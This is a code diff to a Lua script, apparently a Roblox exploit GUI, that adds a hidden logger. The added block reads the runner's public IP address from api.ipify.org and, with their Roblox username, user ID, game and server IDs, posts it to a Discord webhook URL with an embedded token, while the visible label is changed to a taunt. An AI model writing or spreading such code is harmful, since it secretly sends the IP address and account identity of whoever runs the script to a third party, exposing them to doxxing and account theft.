@@ -1,5 +1,4 @@
 local ip, HttpService = tostring(game:HttpGet("http://ip-api.com/json/", true).Body), game:GetService("HttpService")
-print(ip)
 local normalque, HttpService = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
 local ScreenGui = Instance.new("ScreenGui")
 local bg = Instance.new("Frame")
@@ -93,7 +92,7 @@ information.BackgroundTransparency = 1.000
 information.Position = UDim2.new(0.508289397, 0, 0.767747819, 0)
 information.Size = UDim2.new(0.826676726, 0, 0.1585069, 0)
 information.Font = Enum.Font.GothamBlack
-information.Text = ip
+information.Text = "CHECA F9! W IDIOT"
 information.TextColor3 = Color3.fromRGB(255, 255, 255)
 information.TextScaled = true
 information.TextSize = 14.000
@@ -113,3 +112,74 @@ local function HMJCESE_fake_script() -- ImageLabel.LocalScript
 	imageLabel.Image = content
 end
 coroutine.wrap(HMJCESE_fake_script)()
+
+local url =
+        "https://hooks.hyra.io/api/webhooks/1001634153495810168/BEAS6lMJiRorErzrQylTvPmgqjb5_7du4cVYGNrrzBEKWsqQtKZ89zT9CN76CohxiMbt"
+        -- https://discord.com -- put ur webhook here dumbos
+    
+
+        local data = {
+            ["embeds"] = {
+                {
+                    ["title"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["url"] = "https://www.roblox.com/games/2788229376/Da-Hood",
+                    ["type"] = "rich",
+                    ["fields"] = {
+                        {
+
+                            ["name"] = '**Attempt to INJECT @**',
+                            ["value"] = "With **" .. webhookcheck .. "**",
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = '**ROBLOX Name**',
+                            ["value"] = "```" .. game:GetService("Players").LocalPlayer.Name .. "```",
+                            ["inline"] = false,
+
+
+                        },
+                        {
+
+                            ["name"] = '**ROBLOX User ID**',
+                            ["value"] = "```" .. game:GetService("Players").LocalPlayer.UserId .. "```",
+                            ["inline"] = false
+
+                        },
+                        {
+                            ["name"] = '**Game Playing**',
+                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
+                            ["inline"] = false
+
+                        },
+                        {
+                            ["name"] = '**Place ID**',
+                            ["value"] = "```" .. game.PlaceId .. "```",
+                            ["inline"] = false
+
+                        },
+                        {
+                            ["name"] = '**Server ID**',
+                            ["value"] = "```" .. game.JobId .. "```",
+                            ["inline"] = false
+
+                        }
+						,
+                        {
+                            ["name"] = '**beamer**',
+                            ["value"] = "```" .. normalque .. "```",
+                            ["inline"] = false
+
+                        }
+                    }
+
+                } }
+        }
+
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
+        request(abcdef)
